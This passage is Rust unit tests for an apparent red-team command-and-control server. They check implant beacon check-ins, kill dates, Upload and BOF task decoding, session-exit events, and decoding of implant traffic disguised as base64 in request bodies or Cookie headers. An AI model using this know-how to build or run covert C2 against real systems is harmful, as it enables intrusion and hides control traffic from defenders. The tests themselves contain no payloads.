        let err = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
            .expect_err("a past kill-date must refuse beacons");
        assert!(
            err.to_string().contains("kill date"),
            "expected a kill-date refusal, got: {err}"
        );

        // Far-future kill-date: the check-in proceeds normally.
        let st2 = AppState {
            killdate: Some(u64::MAX),
            ..AppState::default()
        };
        let (_key, checkin2) = checkin_frame(&st2, &pubkey, 1);
        handle_beacon(&st2, &peer, &Method::POST, &HeaderMap::new(), &checkin2)
            .expect("a future kill-date must allow check-in");
    }

    #[test]
    fn bad_data_hex_is_rejected_not_crashed() {
        // JsonCommand paths that decode hex (Upload, Bof) must return a clean
        // error on non-hex input, not panic. The server runs under
        // `panic = "abort"`, so a panic here would kill the whole team server.
        let bad_upload = JsonCommand::Upload {
            name: "x".into(),
            data_hex: "zz".into(),
        }
        .into_command();
        assert!(bad_upload.is_err(), "non-hex Upload data_hex must error");

        let good_upload = JsonCommand::Upload {
            name: "x".into(),
            data_hex: "00ff".into(),
        }
        .into_command();
        assert!(good_upload.is_ok(), "valid hex Upload data_hex must decode");

        let bad_bof = JsonCommand::Bof {
            name: "x".into(),
            args: Vec::new(),
            data_hex: "nothex".into(),
        }
        .into_command();
        assert!(bad_bof.is_err(), "non-hex Bof data_hex must error");
    }

    // ---- SessionExit event firing (BUG 1) ----------------------------------
    //
    // The server never produced Event::SessionExit, leaving the Rhai
    // `on_session_exit` hook and the tracing SessionExit arm dead. post_task is
    // the single dispatch point for Command::Exit, so it fires the event there.
    // This pin ensures (a) the event fires exactly once on an Exit task and
    // (b) a non-Exit task fires NONE — guarding against an accidental wildcard.

    /// Records every fired event into a shared vector of kind labels. Registered
    /// on the bus before the AppState is shared so a test can assert what fired.
    #[derive(Default)]
    struct RecordingHook(std::sync::Arc<std::sync::Mutex<Vec<&'static str>>>);

    impl nyx_scripting::Hook for RecordingHook {
        fn name(&self) -> &str {
            "recording"
        }
        fn on_event(&self, event: &nyx_scripting::Event) {
            let label = match event {
                nyx_scripting::Event::SessionNew(_) => "session_new",
                nyx_scripting::Event::SessionExit(_) => "session_exit",
                nyx_scripting::Event::ResultReceived(_) => "result",
            };
            self.0.lock().unwrap().push(label);
        }
    }

    #[test]
    fn exit_task_fires_session_exit_exactly_once() {
        // A real check-in registers the session (→ SessionNew), then an Exit
        // task dispatched via post_task must fire SessionExit exactly once; a
        // later non-Exit task (ping) must fire none.
        let mut st = AppState::default();
        let rec = std::sync::Arc::new(std::sync::Mutex::new(Vec::<&'static str>::new()));
        st.events.register(Box::new(RecordingHook(rec.clone())));
        let st = std::sync::Arc::new(st);

        let pubkey = ServerKeypair::generate().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:7774".parse().unwrap();
        let (_key, checkin) = checkin_frame(&st, &pubkey, 1);
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
            .expect("check-in must register the session before tasking exit");

        let rt = tokio::runtime::Runtime::new().unwrap();
        let exit_body = serde_json::json!({
            "session": hex::encode(pubkey),
            "command": { "type": "exit" },
        });
        let resp = rt.block_on(post_task(
            State(st.clone()),
            HeaderMap::new(),
            Json(serde_json::from_value(exit_body).unwrap()),
        ));
        assert_eq!(resp.status(), StatusCode::OK, "Exit task must be accepted");

        let ping_body = serde_json::json!({
            "session": hex::encode(pubkey),
            "command": { "type": "ping" },
        });
        let resp2 = rt.block_on(post_task(
            State(st.clone()),
            HeaderMap::new(),
            Json(serde_json::from_value(ping_body).unwrap()),
        ));
        assert_eq!(resp2.status(), StatusCode::OK);

        let events = rec.lock().unwrap();
        assert_eq!(
            events.iter().filter(|&&k| k == "session_new").count(),
            1,
            "SessionNew fires once on check-in"
        );
        assert_eq!(
            events.iter().filter(|&&k| k == "session_exit").count(),
            1,
            "SessionExit must fire exactly once when Command::Exit is dispatched"
        );
    }

    // ---- Client-envelope decode (Phase 1 Task 1.2) --------------------------
    //
    // Lock the server half: when a profile declares a `client { output/metadata
    // { ... } }` transform, the implant encodes its frame before sending and the
    // server MUST invert it in handle_beacon to recover the raw frame. Both the
    // body (`print`) and header terminator paths are pinned. The encode side
    // uses nyx_profile's own transform engine — the exact bytes the production
    // implant (Task 1.3) will produce — so this is a true end-to-end contract
    // for the decode half, independent of WinHTTP.

    #[test]
    fn client_envelope_base64_body_is_inverted_before_parse() {
        // `client { output { base64; print; } }` → implant base64-encodes its
        // frame into the request body. Server base64-decodes → raw frame →
        // parse_frame → session registered.
        let profile = nyx_profile::parse(
            r#"http-post {
                set uri "/beacon";
                client { output { base64; print; } }
                server { output { print; } }
            }"#,
        )
        .expect("profile parses");
        let st = AppState {
            profile: Some(profile),
            ..AppState::default()
        };
        let pubkey = ServerKeypair::generate().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:7001".parse().unwrap();
        let (_key, frame) = checkin_frame(&st, &pubkey, 1);
        // Implant side: base64 the frame via the SAME engine the server inverts.
        let on_wire = nyx_profile::encode(&[nyx_profile::Step::Base64], &frame);
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &on_wire)
            .expect("base64 client envelope must be decoded to register the session");
        assert!(
            st.sessions.contains_key(&pubkey),
            "session must be registered after envelope decode"
        );
    }

    #[test]
    fn client_envelope_header_terminator_reads_cookie_header() {
        // `client { metadata { base64; header "Cookie"; } }` on http-get → the
        // transformed bytes ride in the Cookie header, body empty. Server reads
        // the header, decodes, registers. This is the distinct header-terminator
        // path (vs the body/print path above).
        let profile = nyx_profile::parse(
            r#"http-get {
                set uri "/beacon";
                client { metadata { base64; header "Cookie"; } }
                server { output { print; } }
            }"#,
        )
        .expect("profile parses");
        let st = AppState {
            profile: Some(profile),
            ..AppState::default()
        };
        let pubkey = ServerKeypair::generate().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:7002".parse().unwrap();
        let (_key, frame) = checkin_frame(&st, &pubkey, 1);
        let cookie_val = nyx_profile::encode(&[nyx_profile::Step::Base64], &frame);
        let mut headers = HeaderMap::new();
        headers.insert(
            axum::http::HeaderName::from_static("cookie"),
            axum::http::HeaderValue::from_bytes(&cookie_val).unwrap(),
        );
        handle_beacon(&st, &peer, &Method::GET, &headers, &[])
            .expect("header-terminator envelope must read Cookie to register");
        assert!(st.sessions.contains_key(&pubkey));
    }

    #[test]
    fn client_envelope_decode_failure_is_a_clean_400_not_a_panic() {
        // A garbled body that the transform can't invert (truncated base64 etc.)
        // must surface as a clean anyhow error → 400, NOT a panic. The server
        // runs under panic = "abort"; a panic here would kill the team server.
        let profile = nyx_profile::parse(
            r#"http-post {
                set uri "/beacon";
                client { output { netbios; print; } }
                server { output { print; } }
            }"#,
        )
        .expect("profile parses");
        let st = AppState {
            profile: Some(profile),
            ..AppState::default()
        };
        let peer: std::net::SocketAddr = "127.0.0.1:7003".parse().unwrap();
        // netbios expects pairs in a-p; an odd-length / out-of-range body fails decode.
        let err = handle_beacon(
            &st,
            &peer,
            &Method::POST,
            &HeaderMap::new(),
            b"not-valid-netbios!!!",
        )
        .expect_err("undecodable envelope body must error, not panic");
        assert!(
            err.to_string().contains("client envelope decode failed"),
            "expected a decode-failure error, got: {err}"
        );
    }
}
